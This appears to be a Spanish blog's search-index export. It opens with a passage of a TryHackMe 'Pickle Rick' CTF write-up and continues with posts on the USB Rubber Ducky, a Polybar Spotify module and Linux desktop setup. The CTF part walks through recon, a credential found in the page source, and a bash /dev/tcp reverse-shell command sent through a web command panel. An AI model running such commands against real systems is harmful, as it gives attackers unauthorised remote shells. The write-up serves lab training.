packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 63.615/63.615/63.615/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.26.25 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPorts Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬──────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.26.25 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,80 -sC -sV 10.10.11.105 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d1ed3a0a8738271e3eafc898ea5b27 (RSA) | 256 7396d9e64c6a499612a1b46f571db2 (ECDSA) |_ 256 669f61effb12c69123cbc6280a5d1a (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Rick is sup4r cool Parámetro Función -p22,80 Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos De momento no hay nada raro\u0026hellip;\nReconocimiento web Al entrar a la web lo primero que se ve es lo siguiente\nEl texto traducido al español es:\nAyuda Morty!\nEscucha Morty\u0026hellip; Necesito tu ayuda, me he vuelto a convertir en un pepinillo y esta vez no puedo volver a cambiar.\nNecesito que BURRRP \u0026hellip;.Morty, inicia sesión en mi computadora y encuentra los últimos tres ingredientes secretos para terminar mi poción de pepinillo inverso. ¡El único problema es que no tengo idea de cuál era la contraseña BURRRRRRRRP ! ¡Ayuda Morty, ayuda!\nCon control + u se puede ver si hay algo en el codigo de la web.\nEn una línea se puede ver un comentario que contiene el nombre de un usuario\n\u0026lt;!-- Note to self, remember username! Username: R1ckRul3s --\u0026gt; Buscando subdirectorios Para buscar subdirectorios e intentado con wfuzz (wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.170:8080/FUZZ) y con gobuster (gobuster -u 10.10.43.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir) pero tardaban mucho. Asi que probe con un script de nmap llamado http-enum\n❯ nmap -p80 --script=http-enum 10.10.43.4 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-11 01:05 CET Nmap scan report for 10.10.43.4 Host is up (0.064s latency). PORT STATE SERVICE 80/tcp open http | http-enum: | /login.php: Possible admin folder |_ /robots.txt: Robots file Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds El nmap reporta 2: robots.txt y login.php\nrobots.txt Al entrar a robots.txt solo se ve una frase Wubbalubbadubdub\nlogin.php Al entrar a login.php hay un panel para iniciar sesión, al poner el usuario del principio y la frase del robots.txt de contraseña se abre una página llamada portal.php que hay varias secciones, pero hay una que se llama commands en la cual se pueden ejecutar comandos\nInfiltración Vamos a intentar crear una reverse shell mediante esa ejecución de comandos.\nnc -nlvp 443 Para ponernos en escucha por el puerto 443\nAhora desde de la web vamos a intentar ejecutar lo siguiente:\nbash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1 443 = Puerto en el que estamos en escucha 10.10.10.10 = Ip de nuestra máquina\nPero no recibimos nada\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026#34; Ahora si ya tenemos la reverse shell.\nTratamiento de tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm \u0026ldquo;Flags\u0026rdquo; Para resolver la máquina necesitamos saber los tres ingredientes.\nEl primero lo encontramos en el directorio /var/www/html en un archivo llamado Sup3rS3cretPickl3Ingred.txt El segundo está en /home/rick en un archivo llamado second ingredients El último está en el directorio /root, pero no tenemos acceso, al probar con un sudo su, no pide la contraseña y ya podemos visualizar el último ingrediente que está en un archivo llamado 3rd.txt ","date":"2022-12-10","id":100,"permalink":"/writeups/tryhackme/pickle-rick/","summary":"Un CTF de Rick y Morty. ¡Ayuda a que Rick vuelva a ser humano!\nhttps://tryhackme.com/room/picklerick\nEste desafío temático de Rick y Morty requiere explotar un servidor web para encontrar 3 ingredientes que ayudarán a Rick a hacer su poción para transformarse de nuevo en un ser humano a partir de un pepinillo.","tags":["CTF","Fácil","Linux"],"title":"Pickle Rick"},{"content":"¿Qué es un USB Rubber Ducky? Rubber ducky es un pendrive con unas características especiales, a diferencia de un pendrive normal en el que puedes guardar archivos, fotos, etc. El Rubber Ducky, es un dispositivo que inyecta pulsaciones de teclas previamente definidas. Fue desarrollado por hak5 y se puede conseguir desde su web actualmente por $79.99.\nLo que lo hace tan peligroso es que los antivirus no lo detectan, porque los ordenadores lo interpretan como un teclado.\nEl Rubber ducky ha salido en alguna serie como por ejemplo Mr.Robot.\n(Escena mr.robot)\n¿Como usarlo? Lo primero es sacar la tarjeta micro sd que hay en su interior y meterla en el adaptador, para conectarlo al ordenador Ahora toca crear los scripts para indicarle que es lo que tiene que hacer en cada momento. Para ello se usa el lenguaje de programación Duckyscript DuckyScript Es un lenguaje muy sencillo que se puede usar desde cualquier editor de texto. Además sirve para más dispositivos de hak5 como por ejemplo:\nDuckyScript™ Version Device Compatibility 1.0 Original USB Rubber Ducky (USB-A Only) 2.x Bash Bunny, Key Croc, Packet Squirrel, LAN turtle, Shark Jack, O.M.G Devices 3.0 New USB Rubber Ducky (USB-A \u0026amp; USB-C) REM (Comentarios) Para hacer comentarios se usa REM\nREM Esto no se va a interpretar DELAY El comando DELAY índica al USB que se pare momentáneamente, esto es útil para scripts que por ejemplo abren una ventana o una aplicación y tiene que esperar a que cargue\nDELAY 1000 STRING STRING sirve para que escriba una frase o palabra, el usb automáticamente aprieta el shift en las mayúsculas y la barra espaciadora para los espacios, pero no interpreta los espacios finales\nSTRING Hello world! Lo que escribirá el RubberDucky\nHello world! STRINGLN Es como el string pero al final hace un enter\nTeclas movimiento Se pueden usar para desplazarse por una ventana o aplicación.\nUP DOWN LEFT RIGHT UPARROW DOWNARROW LEFTARROW RIGHTARROW PAGEUP PAGEDOWN HOME END INSERT DELETE DEL BACKSPACE TAB SPACE Teclas del sistema Son utilizadas principalmente por el sistema operativo para funciones especiales y pueden usarse para interactuar con áreas de texto y navegar por la interfaz de usuario.\nENTER ESCAPE PAUSE BREAK PRINTSCREEN MENU APP F1 F2 F3 F4 F5 F6 F7 F8 F9 F0 F11 F12 Teclas de modificación Básicas Son teclas que se combinan con otra tecla para realizar una función especial\nSHIFT ALT CONTROL CTRL COMMAND WINDOWS GUI REM Ejemplo de teclas de modificación REM Windows Run GUI r REM Cerrar Ventana ALT F4 REM Pegar CTRL c Avanzadas Se pueden combinar entre ellas\nCTRL SHIFT ALT SHIFT COMMAND CTRL COMMAND CTRL SHIFT COMMAND OPTION COMMAND OPTION SHIFT CONTROL ALT DELETE Independientes Para pulsar una tecla modificadora sola se tiene que poner antes INJECT_MOD\nREM Ejemplo presionando la tecla de Windows sola INJECT_MOD WINDOWS Teclas de Bloqueo Las teclas de bloqueo alternan entre activado y desactivado\nCAPSLOCK NUMLOCK SCROLLOCK Botón Dentro del Rubber Ducky hay un pequeño botón el cual se puede combinar con los scripts, por defecto, al pulsarlo reinicia el script que tiene cargado, pero se puede modificar su función:\nWAIT_FOR_BUTTON_PRESS Sirve para pausar el script hasta que se presione el botón\nREM Ejemplo uso de WAIT_FOR_BUTTON_PRESS STRING Hello World! WAIT_FOR_BUTTON_PRESS STRING Has presionado el botón... BUTTON_DEF Define una función que se ejecutará cuando se presione el botón en cualquier momento dentro del script, siempre que el botón no esté ya en uso por el comando WAIT_FOR_BUTTON_PRESS u otra función similar.\nBUTTON_DEF STRING Has presionado el botón. END_BUTTON DISABLE_BUTTON y ENABLE_BUTTON Como su propio nombre indica, sirve para desactivar y activar el botón.\nDISABLE_BUTTON REM Botón desactivado ENABLE_BUTTON REM Botón activado LED El Ruber Ducky En su interior tiene un pequeño LED el cual se puede controlar en los scripts\nLED_OFF Apaga el led\nLED_R Pondrá el led rojo\nLED_G Pondrá el led verde\n¿Dónde Programarlo? En el apartado de soporte del RubberDucky se puede descargar un JSEncoder, es un archivo con extension .html. En linux se abre con firefox jsencoder.html y en windows: click derecho, abrir con, navegador\nCambiar idioma de los scripts El Rubber Ducky tiene la distribución de teclado inglés por defecto, para poder cambiarlo hay que descargar el idioma deseado desde https://github.com/hak5/usbrubberducky-payloads/tree/master/languages para después ponerlo en el jsencoder\nPrimer hola mundo Para que el Rubber Ducky haga un hola mundo, hay que poner en el jsencoder lo sieguiente:\nDELAY 200 STRING Hola Mundo!!! Ahora solo hace falta clicar a generate payload y se descargará un archivo llamado inject.bin, el cual se tiene que poner en la tarjeta micro sd (solo puede haber un inject.bin, (borra los antiguos).\nComo protegerse Lo primero y más obvio es no dejarte ordenadores, móviles, impresoras, etc\u0026hellip; desbloqueados.\nExiste un programa para windows que se queda corriendo en segundo plano y te protege de el Rubber ducky y dispositivos similares. No lo e probado pero por lo que e visto por internet, cuando detecta el RubberDucky lo para, bloquea el ordenador y guarda todas las pulsaciones de teclado del RubberDucky para ver las intenciones del atacante\nhttps://lospi.net/beamgun/\n","date":"2022-12-05","id":101,"permalink":"/blog/cuidado-con-este-usb/","summary":"¿Qué es un USB Rubber Ducky? Rubber ducky es un pendrive con unas características especiales, a diferencia de un pendrive normal en el que puedes guardar archivos, fotos, etc.","tags":["USB","hak5"],"title":"¡Cuidado con este USB!"},{"content":"¿Qué es? Es un simple módulo para la polybar que muestra que canción se está reproduciendo y se pueden añadir botones para pausar y pasar canciones.\n¿Como añadirlo a la polybar? Para añadirlo a la polybar se tienen que seguir los siguientes dos pasos: irte al archivo donde tengas los módulos de la polybar, en mi caso ~/.config/polybar/modules.ini, y abajo del todo copiar lo siguiente\nMódulos Módulo Song Añádelo si quieres que salga la canción que se està reproduciendo\u0026hellip; [module/song] type = custom/script exec = ~/.config/bin/song.sh interval = 1 format-prefix = \u0026#34; \u0026#34; format = \u0026lt;label\u0026gt; Módulo Previous Añádelo si quieres tener el botón para reproducir la canción anterior [module/previous] type = custom/script exec = ~/.config/bin/previous.sh interval = 1 ;format-prefix = \u0026#34; \u0026#34; format = \u0026lt;label\u0026gt; click-left = dbus-send --print-reply --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.mpris.MediaPlayer2.Player.Previous Módulo Next Añádelo si quieres tener el botón para reproducir la canción siguiente [module/next] type = custom/script exec = ~/.config/bin/next.sh interval = 1 ;format-prefix = \u0026#34; \u0026#34; format = \u0026lt;label\u0026gt; click-left = dbus-send --print-reply --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.mpris.MediaPlayer2.Player.Next Módulo Play Añádelo si quieres tener el botón para parar y reproducir una canción [module/play] type = custom/script exec = ~/.config/bin/play.sh interval = 1 ;format-prefix = \u0026#34; \u0026#34; format = \u0026lt;label\u0026gt; click-left = dbus-send --print-reply --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.mpris.MediaPlayer2.Player.PlayPause Archivos Para que los módulos funcionen hay que poner los siguientes archivos en la carpeta ~/.config/bin/ ¡Acuérdate de darle permisos de ejecución a todos con chmod +x!\nsong.sh Contenido del archivo song.sh #!/bin/bash if [[ \u0026#34;$(dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames)\u0026#34; == *org.mpris.MediaPlayer2.spotify* ]]; then artist=$(dbus-send --print-reply --session --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.freedesktop.DBus.Properties.Get string:\u0026#39;org.mpris.MediaPlayer2.Player\u0026#39; string:\u0026#39;Metadata\u0026#39; | awk \u0026#39;/artist/{getline; getline; split($0,a,\u0026#34;\\\u0026#34;\u0026#34;); print a[2]}\u0026#39;) song=$(dbus-send --print-reply --session --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.freedesktop.DBus.Properties.Get string:\u0026#39;org.mpris.MediaPlayer2.Player\u0026#39; string:\u0026#39;Metadata\u0026#39; | awk \u0026#39;/title/{getline; split($0,a,\u0026#34;\\\u0026#34;\u0026#34;); print a[2]}\u0026#39;) echo $song - $artist else echo \u0026#34;\u0026#34; fi next.sh Contenido del archivo next.sh #!/bin/bash if [[ \u0026#34;$(dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames)\u0026#34; == *org.mpris.MediaPlayer2.spotify* ]]; then echo \u0026#34;\u0026#34; else echo \u0026#34;\u0026#34; fi previous.sh Contenido del archivo previous.sh #!/bin/bash if [[ \u0026#34;$(dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames)\u0026#34; == *org.mpris.MediaPlayer2.spotify* ]]; then echo \u0026#34;\u0026#34; else echo \u0026#34;\u0026#34; fi play.sh Contenido del archivo play.sh #!/bin/bash if [[ \u0026#34;$(dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames)\u0026#34; == *org.mpris.MediaPlayer2.spotify* ]]; then echo \u0026#34;\u0026#34; else echo \u0026#34;\u0026#34; fi ¡Novedad Animated Song! Algunas personas que usaron estos módulos me comentaron que al escuchar canciones muy largas, les ocupaba mucho espacio en la polybar, por eso hice con la ayuda de b3nder0n el siguiente script, que básicamente lo que hace es animar el texto de la canción para que solo ocupe x caracteres previamente definidos\u0026hellip;\nConfiguración Para su configuración es casi igual que los otros módulos, los pasos son los siguientes\nArchivos Para su correcto funcionamiento hay que crear los siguientes archivos ~/.config/bin/ y no te olvides de darles permiso de ejecución con chmod\nanimated.sh Contenido del animated.sh #!/bin/bash lenght=15 if [[ \u0026#34;$(dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames)\u0026#34; == *org.mpris.MediaPlayer2.spotify* ]]; then artist=$(dbus-send --print-reply --session --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.freedesktop.DBus.Properties.Get string:\u0026#39;org.mpris.MediaPlayer2.Player\u0026#39; string:\u0026#39;Metadata\u0026#39; | awk \u0026#39;/artist/{getline; getline; split($0,a,\u0026#34;\\\u0026#34;\u0026#34;); print a[2]}\u0026#39;) song=$(dbus-send --print-reply --session --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.freedesktop.DBus.Properties.Get string:\u0026#39;org.mpris.MediaPlayer2.Player\u0026#39; string:\u0026#39;Metadata\u0026#39; | awk \u0026#39;/title/{getline; split($0,a,\u0026#34;\\\u0026#34;\u0026#34;); print a[2]}\u0026#39;) text=\u0026#34;阮 $song - $artist \u0026#34; num_char=$(echo -n $text | wc -c) text2=${text// /#} if [[ $lenght \u0026lt; $num_char ]];then letter=$(cat ~/.config/bin/progress.txt) times=0 result=() for (( i=0 ; i \u0026lt; ${#text} ; i++ )) { a[$i]=${text2:i:1} } until [ $lenght -lt $times ]; do letter=$(($letter + 1)) times=$(($times + 1)) if [[ $letter -lt $num_char ]]; then result+=(${a[$letter]}) else letter=-1 fi done echo $(($letter - $times + 1)) \u0026gt; ~/.config/bin/progress.txt echo ${result[@]} | tr -d \u0026#34; \u0026#34; | tr \u0026#34;#\u0026#34; \u0026#34; \u0026#34; else echo $text fi else echo \u0026#34;\u0026#34; fi progress.txt Hace falta crear un archivo llamado progress.txt, tambien en ~/.config/bin/ Módulo Para su correcto funcionamiento hay que añadirlo abajo del todo en el archivo de módulos de la polybar, en mi caso ~/.config/polybar/modules.ini y después activarlo en el config.ini\n[module/animated-song] type = custom/script exec = ~/.config/bin/animated.sh interval = 1 format = \u0026lt;label\u0026gt; Para graduar la velocidad se tiene que cambiar el valor de interval, el número de interval equivale a la velocidad por carácter.\nPara modificar el máximo de caracteres se tiene que especificar en la variable lenght del animated.sh\n","date":"2022-11-29","id":102,"permalink":"/blog/m%C3%B3dulo-polybar-spotify/","summary":"¿Qué es? Es un simple módulo para la polybar que muestra que canción se está reproduciendo y se pueden añadir botones para pausar y pasar canciones.","tags":["Linux","bash","polybar","Spotify"],"title":"Módulo Polybar Spotify"},{"content":"","date":"2022-11-29","id":103,"permalink":"/tags/polybar/","summary":"","tags":[],"title":"polybar"},{"content":"","date":"2022-11-29","id":104,"permalink":"/tags/spotify/","summary":"","tags":[],"title":"Spotify"},{"content":"En esta guía explico como puedes crear tu propio entorno completamente personalizable y desde 0, para que puedas dar tu 100% en tu trabajo o estudios. ¡Aviso! Esta guía está pensada para distribuciones basadas en debían aunque se puede hacer en otras también, pero los comandos cambiaran\nEjemplos de entornos hechos por mí:\nEjemplo 1\nEjemplo 2\nBspwm ¿Qué es? Bspwm es un gestor de ventanas tipo mosaico, lo cual va muy bien para escribir y programar. Aunque si necesitas hacer tareas en las cuales necesites otro entorno de escritorio, puedes cambiarlo en el menú de login.\n¿Cómo se instala? sudo apt install bspwm Configuración El archivo de configuración de bspwm se tiene que mover a ~/.config/bspwm/bspwmrc\nbspwmrc default:\n#! /bin/sh pgrep -x sxhkd \u0026gt; /dev/null || sxhkd \u0026amp; bspc monitor -d I II III IV V VI VII VIII IX X bspc config border_width 2 bspc config window_gap 12 bspc config split_ratio 0.52 bspc config borderless_monocle true bspc config gapless_monocle true bspc rule -a Gimp desktop=\u0026#39;^8\u0026#39; state=floating follow=on bspc rule -a Chromium desktop=\u0026#39;^2\u0026#39; bspc rule -a mplayer2 state=floating bspc rule -a Kupfer.py focus=on bspc rule -a Screenkey manage=off Ahí puedes personalizar la cantidad de espacios de trabajo que quieras, puedes poner programas que se ejecuten al abrir bspwm, configurar bordes, etc\u0026hellip;\nPolybar ¿Qué es? Polybar es una herramienta para crear la barra de estado, es totalmente personalizable, las únicas dos limitaciones que tiene es que no la puedes poner a la derecha o a la izquierda y que no puedes poner imágenes.\n¿Cómo se instala? sudo apt install polybar Configuración La Polybar se divide en diferentes módulos como por ejemplo el módulo de la fecha, wifi, etc\u0026hellip; puedes usar los de los temas, añadir módulos extras o crearlos todos desde 0\nTemas Existen muchos temas ya creados para la polybar como por ejemplo\ngithub.com/adi1090x/polybar-themes\nSi os gustan o los usáis no olvidéis apoyar al creador dándole una estrella en github\n¿Cómo instalar los temas?: adi1090x\n#Clonar el Repositorio git clone https://github.com/adi1090x/polybar-themes #Y entrar en la carpeta, dar permisos de ejecución al setup.sh y ejecutarlo. cd polybar-themes chmod +x setup.sh ./setup.sh Mi tema\n#Clonar el repositorio git clone https://github.com/d3b0o/dotfiles #Crear la carpeta de configuraciones de la polybar y mover la configuración ahí. cd dotfiles mv polybar ~/.config/polybar Ahora en el ~/.config/polybar/ tenéis todos los temas instalados.\n¿Qué hace cada archivo? Cada tema tiene los siguientes archivos (Algunos temas tienen otros archivos, pero al final todos tienen lo mismo)\nArchivo Función config.ini Archivo que contiene la configuración general de la polybar modules.ini Configuración de los módulos bars.ini Configuración de los módulos con barras colors.ini Todos los colores launch.sh Al ejecutarlo, se muestra la polybar, para que se muestre la polybar cada vez que abrimos el bspwm tendremos que agregar la ruta del launch en el ~/.config/bspwm/bspwmrc user_modules.ini Ahí están todos los módulos de usuario Módulos Configuración módulos Principales configuraciones de los módulos\nVariables Función interval En interval puedes poner cada cuanto tiempo quieres que se actualice (en segundos) format-prefix Puedes poner el icono que quieras format-prefix-foreground El color del icono label Puedes escoger que es lo que quieres que ponga, en Available tokens tinenes las opciones disponibles format Puedes escoger el formato que quieres que tenga, en Available tokens tinenes las opciones disponibles ¿Cómo crear un módulo? Plantilla para módulo script [module/] type = custom/script interval = exec = En exec se tiene que poner el script que quieres que el output salga en la polybar\nPlantilla para módulo texto [module/] type = custom/text content = En content va el texto que quieres que salga en la polybar\nEn los módulos puedes añadir que al clicar ejecute algo\u0026hellip;\nclicks posibles click-left = click-middle = click-right = scroll-up = scroll-down = double-click-left = double-click-right = sxhkd ¿Qué es? sxhkd es un simple servicio de combinaciones de teclas usables dentro de bspwm, requerido para comunicarse con bspwm y lanzar aplicaciones a elección.\n¿Cómo se instala? git clone https://github.com/baskerville/sxhkd.git cd sxhkd make Configuración Para la configuración hay que tener el siguiente archivo en ~/.config/sxhkd/sxhkdrc\nhttps://github.com/baskerville/bspwm/blob/master/examples/sxhkdrc\n¿Cómo añadir comandos personalizados? Abajo del archivo de configuración (~/.config/sxhkd/sxhkdrc)\n#combinación de teclas #que ejecutara #Ejemplo super + shift + g google-chrome Picom ¿Qué es? Picom, es lo que se conoce como un compositor para Xorg. Se trata de un fork de compton que a su vez es un fork de otros compositorios. Este compositor te permite utilizar tanto sombras, como transparencias, como redondear bordes, etc\u0026hellip;\n¿Cómo se instala? #dependencias sudo apt install libxext-dev libxcb1-dev libxcb-damage0-dev libxcb-xfixes0-dev libxcb-shape0-dev libxcb-render-util0-dev libxcb-render0-dev libxcb-randr0-dev libxcb-composite0-dev libxcb-image0-dev libxcb-present-dev libxcb-xinerama0-dev libxcb-glx0-dev libpixman-1-dev libdbus-1-dev libconfig-dev libgl-dev libegl-dev libpcre2-dev libevdev-dev uthash-dev libev-dev libx11-xcb-dev meson git clone https://github.com/ibhagwan/picom.git cd picom git submodule update --init --recursive meson --buildtype=release . build ninja -C build sudo ninja -C build install Configuración El archivo de configuración de picom está en ~/.config/picom/picom.conf, en él puedes modificar los bordes, sombras, transparencias, etc\u0026hellip;\nEsto es lo que contiene el picom.conf\nhttps://gist.github.com/scheckley/b91d7b50c7f372ba7107baf01127da3a\nRofi ¿Qué es? Rofi comenzó como un clon de simpleswitcher, escrito por Sean Pringle, un conmutador de ventana emergente basado aproximadamente en superswitcher. Simpleswitcher sentó las bases y, por lo tanto, Sean Pringle merece la mayor parte del crédito por esta herramienta. Rofi (renombrado, ya que perdió la propiedad simple) se ha ampliado con funciones adicionales, como un iniciador de aplicaciones y un iniciador de ssh, y puede actuar como un reemplazo de dmenu directo, lo que lo convierte en una herramienta muy versátil.\nRofi, como dmenu, proporcionará al usuario una lista textual de opciones donde se pueden seleccionar una o más. Esto puede ser ejecutar una aplicación, seleccionar una ventana u opciones proporcionadas por un script externo.\n¿Cómo se instala? sudo apt install rofi Configuración Temas Al igual que la polybar hay muchos temas ya creados como por ejemplo:\ngithub.com/adi1090x/rofi\nSi usáis u os gustan los temas no olvidéis darle una estrella en github\nPara instalar el tema es simplemente:\ngit clone 2--depth=1 https://github.com/adi1090x/rofi.git cd rofi chmod +x setup.sh ./setup.sh Configuración temas Todos los temas están en el ~/.config/rofi\nEn el github de los temas hay fotos de todos los temas y puedes escoger el que más te guste\nPara abrir rofi simplemente tienes que ejecutar él .sh que hay en la carpeta de los temas\n","date":"2022-11-25","id":105,"permalink":"/blog/como-personalizar-tu-entorno-linux/","summary":"En esta guía explico como puedes crear tu propio entorno completamente personalizable y desde 0, para que puedas dar tu 100% en tu trabajo o estudios.","tags":["Linux","Personalización"],"title":"Como Personalizar Tu Entorno Linux"},{"content":"","date":"2022-11-25","id":106,"permalink":"/tags/personalizaci%C3%B3n/","summary":"","tags":[],"title":"Personalización"},{"content":"","date":"0001-01-01","id":107,"permalink":"/categories/","summary":"","tags":[],"title":"Categories"}]